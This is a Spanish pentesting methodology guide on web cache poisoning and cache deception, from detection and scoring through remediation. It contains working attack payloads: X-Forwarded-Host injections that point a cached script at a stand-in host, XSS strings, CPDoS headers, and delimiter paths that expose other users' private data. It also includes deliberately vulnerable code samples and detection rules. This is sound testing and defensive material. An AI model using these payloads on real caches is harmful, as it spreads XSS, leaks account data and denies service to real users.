# Envenenamiento y engaño de caché web (Web Cache Poisoning / Web Cache Deception)

| Clasificación | |
|---|---|
| CWE | Envenenamiento: CWE-349 — Acceptance of Extraneous Untrusted Data With Trusted Data; CWE-444 (cuando se combina con desync); CWE-79 (si el payload es XSS). Engaño: CWE-524 — Use of Cache Containing Sensitive Information; CWE-525 — Use of Web Browser Cache Containing Sensitive Information |
| OWASP Top 10:2025 | A02 — Security Misconfiguration (reglas de caché y claves); A05 — Injection si el payload cacheado es XSS; A01 — Broken Access Control para la exposición de datos privados por engaño |
| OWASP API Top 10:2023 | API8:2023 — Security Misconfiguration (respuestas de API cacheadas con datos de usuario) |
| WSTG | Sin caso específico; relacionados: WSTG-INPV-17 (Host Header Injection, incluye envenenamiento), WSTG-ATHN-06 (Browser Cache Weaknesses), WSTG-CONF-* |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (oráculo de caché y *cache buster*) · 4. Explotación (entradas no incluidas en la clave, parámetros excluidos, *parameter cloaking*, *fat GET*, normalización de la clave, CPDoS, frameworks; engaño por mapeo de rutas, delimitadores y normalización) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

> ⚠️ **Regla de oro**: envenenar una entrada de caché compartida afecta a **usuarios reales**. Todas las pruebas de envenenamiento usan un **cache buster** (parámetro o cabecera única que forma parte de la clave) para que solo tú obtengas la respuesta envenenada. Envenenar una URL sin cache buster requiere confirmación explícita del cliente.

---

## 1. Qué es y por qué ocurre

Una **caché web** (CDN, proxy inverso como Varnish o nginx, caché de framework) guarda respuestas para servirlas a otros usuarios sin consultar al servidor de origen. Decide si dos peticiones son "la misma" mediante la **clave de caché** (*cache key*): normalmente método, host, ruta y query. Lo que no forma parte de la clave son las **entradas no incluidas en la clave** (*unkeyed inputs*): la mayoría de cabeceras, cookies y a veces parte de la query.

- **Envenenamiento de caché** (*web cache poisoning*): el atacante envía una entrada no incluida en la clave que **altera la respuesta** (p. ej. `X-Forwarded-Host` que acaba en una URL de script) y consigue que esa respuesta dañina se guarde bajo una clave que visitan otros usuarios. Convierte un fallo "auto-XSS" o una reflexión de cabecera inexplotable en un ataque masivo sin interacción adicional.
- **Engaño de caché** (*web cache deception*): el atacante consigue que la caché guarde una **respuesta privada de la víctima** (su perfil, tokens, datos) creyendo que es un recurso estático, engañándola para que visite una URL como `/mi-cuenta/x.css`. Luego el atacante pide esa misma URL y recibe los datos cacheados. Ocurre por **discrepancias** entre cómo interpretan la ruta la caché y el origen.

## 2. Dónde buscar (señales del reconocimiento)

- Cabeceras de caché: `Cache-Control`, `Age`, `Expires`, `Vary`, `X-Cache: HIT/MISS`, `CF-Cache-Status`, `X-Cache-Hits`, `X-Served-By`, `X-Varnish`, `Via`, `X-Drupal-Cache`, `X-Proxy-Cache`, `Akamai-Cache-Status` (con `Pragma: akamai-x-cache-on` en algunos entornos), `X-Nextjs-Cache`, `x-vercel-cache`.
- Respuestas que reflejan cabeceras o valores derivados: URLs absolutas (`<script src="https://HOST/...">`, `<link rel=canonical>`, `og:url`), redirecciones (`Location`), JSON con `baseUrl`, idioma/región por cookie, rutas de recursos según `X-Forwarded-Proto`.
- Páginas dinámicas con `Cache-Control: public` o sin cabeceras de caché tras una CDN con reglas por extensión.
- Endpoints privados (`/account`, `/api/me`, `/settings`) que responden igual con sufijos (`/account/x`, `/account.css`).
- Reglas de caché típicas: por extensión (`.js .css .png .ico .svg .woff2`), por directorio (`/static/`, `/assets/`, `/_next/static/`, `/wp-content/`), por fichero (`/robots.txt`, `/favicon.ico`).

## 3. Detección segura (primeras sondas, no destructivas)

1. **Oráculo de caché**: identifica una página cacheable y cómo saber si la respuesta viene de caché (`X-Cache`, `Age` creciente, tiempo de respuesta).
2. **Cache buster**: añade un parámetro único (`?cb=corvus7f3a`) y confirma que forma parte de la clave (primera petición `MISS`, segunda `HIT`, otro valor vuelve a `MISS`). Si la query completa no forma parte de la clave, usa una cabecera incluida en `Vary` o un cache buster en la ruta (`/./`, `//`, mayúsculas si la clave las distingue).
3. **Descubrir entradas no incluidas en la clave** con Param Miner (cabeceras y parámetros) o manualmente:

   ```http
   GET /?cb=corvus7f3a HTTP/1.1
   Host: target.example
   X-Forwarded-Host: corvus-xfh.example
   ```

   Si `corvus-xfh.example` aparece en la respuesta y una segunda petición **sin** la cabecera (mismo `cb`) devuelve la versión con `corvus-xfh.example` y `HIT`, la cabecera no está en la clave y la respuesta es envenenable.

4. **Engaño**: con **tu propia cuenta de prueba**, pide `/mi-cuenta/corvus.css` (o variantes de §4.2) y comprueba si devuelve tus datos con cabeceras de caché `MISS` y luego `HIT`. Verifica desde otra sesión **sin cookies** (navegador privado) que obtienes tus datos.

## 4. Explotación por contexto o tecnología

### 4.1 Envenenamiento de caché

**Cabeceras no incluidas en la clave** (prueba una a una, siempre con cache buster):

```
X-Forwarded-Host: corvus.example          X-Host: corvus.example            X-Forwarded-Server: corvus.example
X-Original-Host: corvus.example           Forwarded: host=corvus.example    X-HTTP-Host-Override: corvus.example
X-Forwarded-Scheme: http                  X-Forwarded-Proto: http           X-Forwarded-SSL: off     # bucles o redirecciones a http
X-Forwarded-Port: 1337                    X-Original-URL: /corvus404        X-Rewrite-URL: /corvus404   # Symfony/IIS: reescritura de ruta
X-HTTP-Method-Override: POST              X-Method-Override: DELETE          # cambia la respuesta cacheada
Accept-Language / Cookie: lang=…         # si cambian el contenido pero no están en Vary ni en la clave
User-Agent                                # si el origen sirve versiones distintas (móvil) y la clave no lo distingue
```

Ejemplo de XSS persistente vía recurso de script:

```http
GET /?cb=corvus7f3a HTTP/1.1
Host: target.example
X-Forwarded-Host: corvus-oast.example
```
```html
<!-- Respuesta cacheada -->
<script src="https://corvus-oast.example/static/analytics.js"></script>
```

Demostración: tu servidor sirve un `analytics.js` con `alert(document.domain)`; la URL con `?cb=corvus7f3a` lo ejecuta para cualquiera que la visite, pero solo existe esa clave.

**Combinación de dos cabeceras**: `X-Forwarded-Scheme: http` provoca una redirección a `https://` + `X-Forwarded-Host` que la construye con tu dominio → redirección cacheada a tu dominio.

**Query no incluida en la clave**: si la CDN excluye la query completa, un XSS reflejado en un parámetro se vuelve almacenado para la ruta base:

```
GET /buscar?q=<script>alert(document.domain)</script>     → cacheado como /buscar
```

**Parámetros excluidos de la clave** (p. ej. `utm_*`, `fbclid`, `gclid`, `_`) que el origen sí procesa:

```
GET /?cb=corvus7f3a&utm_content='><img src=x onerror=alert(1)>
```

***Parameter cloaking*** (ocultar un parámetro dentro de otro): la caché separa parámetros solo por `&` y el origen (Ruby on Rails/Rack, Bottle y otros) también por `;`. La caché ve un `utm_content` excluido y el origen ve además `callback`:

```
GET /js/geolocate.js?callback=setCountry&utm_content=x;callback=alert(1)//
```

***Fat GET*** (`GET` con cuerpo): la clave usa la query, pero el origen lee parámetros del cuerpo:

```http
GET /js/geolocate.js?callback=setCountry HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

callback=alert(1)//xxx
```

(También con `X-HTTP-Method-Override: POST` si el origen solo lee el cuerpo en `POST`.)

**Normalización de la clave**: la caché normaliza (decodifica `%2f`, minúsculas, elimina `/./`) pero el origen no, o al revés, de modo que una URL "rara" con XSS reflejado en la ruta se guarda bajo la clave de la URL normal:

```
GET /corvus%3Cscript%3Ealert(1)%3C/script%3E    → clave normalizada que la víctima visita
GET /static/..%2f..%2fpagina?x=<payload>
```

**Puerto en `Host`**: algunas CDN excluyen el puerto de la clave y el origen lo usa en redirecciones: `Host: target.example:1337` → `Location: https://target.example:1337/` cacheado (DoS por redirección rota).

**CPDoS** (*Cache-Poisoned Denial of Service*): conseguir que se cachee una **respuesta de error** para una URL legítima. ⚠️ Es una denegación de servicio para usuarios reales: requiere confirmación explícita del cliente; pruébalo solo con cache buster.

```
HHO (Header Oversize):     X-Oversize: AAAA…(más de lo que acepta el origen, menos de lo que acepta la caché) → 400 cacheado
HMC (Meta Character):      X-Meta: \n  o  \x07 → 400 cacheado
HMO (Method Override):     X-HTTP-Method-Override: DELETE → 404/405 cacheado
```

**Frameworks y plataformas**:

- **Next.js**: respuestas de datos (`/_next/data/…json`, cabecera `RSC: 1` o `x-middleware-prefetch`) cacheadas bajo la clave HTML de la página y viceversa (envenenamiento con contenido de otro tipo o DoS); investigaciones de 2024–2025 sobre el *Pages Router* y caché de ISR. La cabecera interna `x-middleware-subrequest` permitió saltarse el *middleware* de autenticación (CVE-2025-29927); si la CDN la reenvía, prueba también su efecto en caché.
- **Drupal/Symfony**: `X-Original-URL`/`X-Rewrite-URL` en configuraciones con proxies de confianza.
- **Rails/Rack**: separación por `;` en parámetros (cloaking).
- **CDNs con reglas por "página" o *edge workers*** que excluyen la query o cabeceras sin que el origen lo sepa.

### 4.2 Engaño de caché (web cache deception)

Siempre con **cuentas propias**: la víctima simulada es tu segunda cuenta.

**Discrepancia de mapeo de rutas** (el origen ignora segmentos extra, la caché ve una extensión estática):

```
/mi-cuenta/corvus.css
/api/me/corvus.js
/perfil/index.php/corvus.png
```

**Discrepancia de delimitadores** (el origen corta la ruta en un carácter que la caché no trata como delimitador):

```
/mi-cuenta;corvus.css          # ';' parámetros de ruta (Java/Spring)
/mi-cuenta.corvus.css          # '.' selector de formato (Rails)
/mi-cuenta%00corvus.css        # byte nulo (OpenLiteSpeed y otros)
/mi-cuenta%0acorvus.css        /mi-cuenta%23corvus.css       /mi-cuenta%3fcorvus.css
/mi-cuenta!corvus.css          /mi-cuenta%09corvus.css
```

Prueba cada delimitador primero sin extensión (`/mi-cuenta;abc` → ¿devuelve la cuenta?) para saber qué caracteres corta el origen, y luego combina con extensión estática.

**Discrepancia de normalización** (directorios estáticos):

```
# El origen decodifica y resuelve "..", la caché no: la caché ve un prefijo /static/
/static/..%2fmi-cuenta
/assets/..%2f..%2fmi-cuenta
# La caché decodifica y resuelve "..", el origen corta en el delimitador: la caché ve /static/…
/mi-cuenta;%2f%2e%2e%2fstatic
/mi-cuenta%23%2f%2e%2e%2fstatic
# Reglas de fichero exacto
/mi-cuenta;%2f%2e%2e%2frobots.txt
/mi-cuenta%3f%2f%2e%2e%2ffavicon.ico
```

Prueba de impacto: con la cuenta B logueada, visita la URL engañosa (simula a la víctima); desde una sesión **sin cookies**, pide la misma URL y comprueba que recibes los datos de B. En un ataque real, la víctima llegaría por un enlace o recurso incrustado; no lo envíes a usuarios reales.

## 5. Evasión de filtros y WAF

- Si la CDN bloquea cabeceras como `X-Forwarded-Host`, prueba alternativas (`X-Host`, `Forwarded`, cabeceras propias descubiertas con Param Miner) y mayúsculas/minúsculas.
- Si el payload se filtra en la query, busca el reflejo en una cabecera no incluida en la clave o en un recurso secundario (JSON, JS) que importe la página.
- Para engaño: alterna codificaciones (`%2e`, `%252f`), mayúsculas en la extensión (`.CSS`) y extensiones menos comunes que sigan siendo estáticas (`.avif`, `.webp`, `.woff2`, `.map`).
- Encadena con **request smuggling** para envenenar sin cabeceras visibles (ver `vulns/request-smuggling.md`).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Demostración segura |
|---|---|
| Cabecera no incluida en la clave → `<script src>` propio → XSS almacenado masivo | Con cache buster, script que solo hace `alert(document.domain)` |
| Redirección cacheada → robo de tokens en la URL / phishing | Con cache buster, redirección a tu dominio de pruebas |
| Engaño de caché → datos privados, tokens CSRF, claves API | Con tu segunda cuenta; redacta tokens |
| Engaño + token CSRF cacheado → CSRF contra la víctima | Explicar la cadena; ver `vulns/csrf.md` |
| CPDoS → indisponibilidad de páginas clave | ⚠️ Solo con cache buster o con confirmación explícita del cliente |
| Host header → envenenamiento de enlaces de restablecimiento cacheados | Ver `vulns/host-header.md` |
| DOM XSS con datos de un JSON envenenado | Ver `vulns/xss.md` |

## 7. Caja blanca: fuentes, sumideros y patrones de código

Fuentes: cabeceras de host y reenvío, cookies de preferencia, parámetros que el framework separa de forma distinta. Sumideros: construcción de URLs absolutas, redirecciones, inclusión de recursos, respuestas con `Cache-Control: public` o reglas de CDN.

```php
// VULNERABLE: URL base desde cabecera y página cacheable
$base = 'https://' . ($_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST']);
header('Cache-Control: public, max-age=600');
echo "<script src=\"$base/static/app.js\"></script>";
// SEGURO: URL base de configuración; datos privados con no-store
$base = getenv('APP_BASE_URL');
```

```python
# Django — VULNERABLE: USE_X_FORWARDED_HOST = True sin proxy que lo controle; páginas de cuenta sin cabeceras de caché
# SEGURO
from django.views.decorators.cache import never_cache
@never_cache
def account(request): ...
```

```js
// Express — VULNERABLE: confía en X-Forwarded-Host de cualquiera
app.set('trust proxy', true);
const base = `${req.protocol}://${req.hostname}`;  // req.hostname usa X-Forwarded-Host cuando trust proxy está activo
// SEGURO: trust proxy limitado a la IP del balanceador y base de configuración
app.set('trust proxy', ['10.0.0.10']);
res.set('Cache-Control', 'no-store');              // en rutas autenticadas
```

```java
// Spring — VULNERABLE: ForwardedHeaderFilter sin proxy que filtre las cabeceras de entrada
// SEGURO: server.forward-headers-strategy=native solo detrás de un proxy que sobrescriba X-Forwarded-*;
// y en respuestas privadas:
response.setHeader("Cache-Control", "no-store, private");
```

```csharp
// .NET — SEGURO: UseForwardedHeaders con KnownProxies/KnownNetworks y AllowedHosts
builder.Services.Configure<ForwardedHeadersOptions>(o => { o.ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto; o.KnownProxies.Add(IPAddress.Parse("10.0.0.10")); });
```

Revisa también reglas de la CDN/proxy (`vcl`, `nginx.conf` con `proxy_cache_key`, reglas de Cloudflare/Akamai/Fastly, `next.config.js` con `headers()`), y si el origen distingue rutas con sufijos (rutas comodín `/account/**`, `{*path}`, `useSuffixPatternMatch` en Spring antiguo, selector de formato en Rails).

```bash
rg -n -i 'X-Forwarded-Host|HTTP_X_FORWARDED_HOST|X-Original-URL|X-Rewrite-URL|USE_X_FORWARDED_HOST|trust proxy|ForwardedHeader|forward-headers-strategy' .
rg -n -i 'Cache-Control|proxy_cache_key|proxy_cache_valid|s-maxage|stale-while-revalidate|vcl_hash|vcl_recv|cacheKey|cache_key' .
rg -n --pcre2 '(account|profile|settings|me)/\*\*|useSuffixPatternMatch|\{\*\w+\}' .
```

```yaml
rules:
  - id: corvus-express-hostname-in-url
    languages: [javascript, typescript]
    severity: WARNING
    message: URL absoluta construida con el host de la petición (posible envenenamiento de caché / host header)
    pattern-either:
      - pattern: '`${$REQ.protocol}://${$REQ.hostname}...`'
      - pattern: '$REQ.protocol + "://" + $REQ.get("host") + ...'
      - pattern: '$REQ.headers["x-forwarded-host"]'
```

## 8. Falsos positivos frecuentes

- La cabecera se refleja pero la respuesta **no se cachea** (`Cache-Control: private/no-store`, `Set-Cookie` que impide cachear, `Vary` que incluye la cabecera): es una reflexión sin impacto de envenenamiento (valora `vulns/host-header.md`).
- `X-Cache: HIT` en tu segunda petición porque **tu navegador o Burp** usó su caché local: verifica con `curl` y otro origen.
- Caché **por usuario** (clave incluye cookie de sesión): no afecta a otros.
- Engaño de caché que devuelve tus datos solo con tu cookie: la caché no los guardó (`MISS` siempre). Confirma sin cookies.
- Respuestas distintas por balanceo entre varios nodos de caché (HIT/MISS inconsistentes): repite y anota el nodo (`X-Served-By`).

## 9. Evidencia mínima para validarlo

- Petición envenenadora (con cache buster) y respuesta con la entrada reflejada.
- Petición posterior **sin** la entrada maliciosa, desde otro cliente, con `HIT`/`Age` y el contenido envenenado.
- Para engaño: petición de la víctima simulada (cuenta B), petición del atacante sin cookies y respuesta con datos de B; cabeceras de caché de ambas.
- Regla de caché o discrepancia identificada (extensión, directorio, delimitador) y TTL observado.
- Confirmación de que solo se usaron claves únicas (o autorización explícita si no).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| XSS almacenado vía caché en página pública visitada por cualquiera | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N` (8.0) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N` |
| Redirección envenenada / defacement de recursos | `AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` (5.4) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N` |
| CPDoS de páginas clave | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| Engaño de caché con datos personales de la víctima | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (6.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Engaño de caché con tokens de sesión/API → toma de cuenta | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |

`AC:H`/`AT:P` cuando el éxito depende de ganar la ventana de expiración de la caché. Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST.

## 11. Remediación (con ejemplo de código correcto)

1. Cachear solo lo que el origen marca explícitamente como cacheable (`Cache-Control: public`) y **respetar las cabeceras del origen** en la CDN, en lugar de reglas por extensión o directorio.
2. Respuestas autenticadas o personalizadas: `Cache-Control: no-store, private`.
3. No usar entradas fuera de la clave para generar contenido; si es imprescindible, **añadirlas a la clave** o a `Vary`, o **eliminarlas en el borde** (la CDN borra `X-Forwarded-Host`, `X-Original-URL`… de las peticiones entrantes).
4. Configurar el framework para confiar en cabeceras de reenvío solo desde proxies conocidos; URL base desde configuración.
5. Desactivar *fat GET* (ignorar cuerpos en `GET`), unificar el separador de parámetros y la normalización de rutas entre caché y origen.
6. Origen estricto con rutas: devolver 404 para sufijos inesperados (`/mi-cuenta/x.css`) y no tratar delimitadores de forma distinta a la caché; protecciones específicas de CDN contra deception (p. ej. comprobar que el `Content-Type` coincide con la extensión antes de cachear).
7. No cachear errores (o con TTL mínimo).

```nginx
# nginx como caché: no cachear peticiones autenticadas, limpiar cabeceras peligrosas hacia el origen
# (por defecto nginx no cachea respuestas con Set-Cookie ni las marcadas private/no-store)
proxy_cache_key "$scheme$host$request_uri";
proxy_no_cache $http_authorization $cookie_session;
proxy_cache_bypass $http_authorization $cookie_session;
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
proxy_cache_valid 200 10m;                 # sin cachear 4xx/5xx
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Param Miner | "Guess headers" / "Guess params" con cache buster automático | Descubrir entradas no incluidas en la clave |
| Burp Repeater | Confirmar HIT/MISS, reflejos y discrepancias de ruta | Siempre |
| Burp Web Cache Deception Scanner (BApp) | Variantes de rutas y delimitadores | Tras confirmar a mano reglas de caché |
| `curl` | `curl -s -D- -o /dev/null 'https://t/?cb=corvus1' -H 'X-Forwarded-Host: corvus.example'` | Verificación desde un cliente limpio |
| wcvs (Web Cache Vulnerability Scanner, Hackmanit) | Escaneo de envenenamiento con cache busters | Solo tras validar manualmente y confirmar que usa claves únicas |
| Nuclei | Plantillas de cache poisoning | Verificación a escala, con cache buster |

## 13. Referencias

- PortSwigger Web Security Academy — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger Web Security Academy — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- James Kettle — "Practical Web Cache Poisoning" (2018): https://portswigger.net/research/practical-web-cache-poisoning
- James Kettle — "Web Cache Entanglement: Novel Pathways to Poisoning" (2020): https://portswigger.net/research/web-cache-entanglement
- Martin Doyhenard — "Gotta cache 'em all: bending the rules of web cache exploitation" (2024): https://portswigger.net/research/gotta-cache-em-all
- Omer Gil — "Web Cache Deception Attack" (2017)
- CPDoS — Cache-Poisoned Denial-of-Service: https://cpdos.org/
- PayloadsAllTheThings — Web Cache Deception; HackTricks — Cache Poisoning and Cache Deception (book.hacktricks.wiki)
- CWE-349, CWE-524: https://cwe.mitre.org/
